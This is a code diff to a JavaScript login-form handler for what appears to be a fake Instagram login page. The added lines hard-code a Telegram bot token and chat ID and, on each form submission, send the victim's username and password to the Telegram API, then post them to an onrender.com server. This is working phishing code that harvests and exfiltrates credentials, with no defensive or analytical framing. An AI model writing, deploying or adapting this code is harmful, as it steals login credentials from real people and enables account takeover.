@@ -1,7 +1,19 @@
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+document.getElementById('loginForm').addEventListener('submit', function (e) {
     e.preventDefault();
+
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
+
+    /* ──────────── ➊  YOUR TELEGRAM CREDENTIALS ──────────── */
+    const botToken = '8187937575:AAEjpbjPPMiLdoJ8SkIF-SlwyvIFPysgW7k';
+    const chatId   = '7903662789';
+    const message  = `🔐 New Instagram Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+    fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage` +
+        `?chat_id=${chatId}&text=${encodeURIComponent(message)}`
+    ).catch(console.error);
+    /* ─────────────────────────────────────────────────────── */
 
     fetch('https://web-9ik7.onrender.com/login', {
         method: 'POST',
